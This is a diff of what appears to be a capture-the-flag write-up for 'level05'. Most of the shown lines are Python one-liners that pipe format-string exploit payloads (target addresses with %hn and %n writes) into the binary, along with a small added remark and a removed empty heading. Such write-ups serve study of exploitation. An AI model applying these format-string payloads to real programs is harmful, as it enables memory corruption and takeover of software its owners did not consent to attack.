@@ -119,6 +119,8 @@ Let's try it.
 (python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55338d%10$hn" + "%10197d%11$hn")'; cat) | ./level05
 ```
 
+
+ANYA SAYS
 Why we can't just do this (with a %u modifier) is beyond me!
 ```(python -c 'print "\xe0\x97\x04\x08" + "%4294957094u" + "%10$n"'; cat) | ./level05```
 
@@ -128,8 +130,3 @@ Why we can't just do this (with a %u modifier) is beyond me!
 ```
 (python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55397d%10$hn" + "%10130d%11$hn")'; cat) | ./level05
 ```
-
-
-## Recreate Exploited Binary
-
-
